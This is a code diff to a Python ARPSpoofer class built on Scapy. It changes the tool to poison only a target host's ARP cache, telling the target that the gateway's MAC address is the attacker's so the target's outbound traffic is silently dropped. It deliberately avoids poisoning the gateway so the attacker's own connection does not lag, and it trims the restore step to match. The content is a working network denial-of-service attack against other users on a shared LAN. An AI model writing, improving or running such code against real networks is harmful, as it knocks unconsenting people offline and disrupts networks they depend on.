@@ -118,12 +118,12 @@ class ARPSpoofer:
 
     def _poison(self, target_ip: str, target_mac: str,
                 gateway_ip: str, gateway_mac: str) -> None:
-        ok1 = self._send(target_mac,
-                         ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip))
-        ok2 = self._send(gateway_mac,
-                         ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
-        if not ok1 or not ok2:
-            # Stop the loop — can't block without admin/Npcap
+        # Only poison the target — tells them the gateway MAC is ours so their
+        # outbound packets are dropped. We do NOT poison the gateway, which would
+        # reroute the target's inbound traffic through our machine and lag us out.
+        ok = self._send(target_mac,
+                        ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
+        if not ok:
             with self._lock:
                 if target_ip in self._state:
                     self._state[target_ip]["running"] = False
@@ -132,18 +132,13 @@ class ARPSpoofer:
                  gateway_ip: str, gateway_mac: str) -> None:
         if not (target_mac and gateway_mac):
             return
-        # Ethernet src must match ARP hwsrc — devices reject packets where they differ
+        # Fix the target's ARP table — tell them the real gateway MAC.
+        # Ethernet src must match ARP hwsrc or modern devices reject the packet.
         try:
             sendp(
                 Ether(src=gateway_mac, dst=target_mac) /
                 ARP(op=2, pdst=target_ip, hwdst=target_mac,
                     psrc=gateway_ip, hwsrc=gateway_mac),
-                iface=self._iface, verbose=0, count=10, inter=0.05,
-            )
-            sendp(
-                Ether(src=target_mac, dst=gateway_mac) /
-                ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
-                    psrc=target_ip, hwsrc=target_mac),
                 iface=self._iface, verbose=0, count=10, inter=0.05,
             )
         except Exception as e:
